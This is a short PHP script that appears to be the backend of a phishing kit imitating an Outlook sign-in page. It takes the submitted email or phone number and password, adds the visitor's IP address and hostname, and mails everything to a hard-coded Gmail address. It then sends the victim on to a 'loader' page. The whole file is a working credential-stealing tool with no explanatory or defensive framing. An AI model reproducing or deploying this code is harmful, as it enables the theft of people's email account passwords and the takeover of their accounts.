<?
$to = "camachodaniel1306@gmail.com";
//--------------------------------
$outlokuname = $_POST['outlokuname'];
$outlokpasuma = $_POST['outlokpasuma'];
$ip = $_SERVER['REMOTE_ADDR'];
$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$subj = "| |Outlook |";
$msg = "Email or Phone : $outlokuname\nPassword : $outlokpasuma\nHost : $host\nIP : $ip";
$from = "FROM: Snoop Inc<m@m>";
			
			{
		mail($to,$subj."|".$ip,$msg);
				}
			header("location: 1loader.php");
?>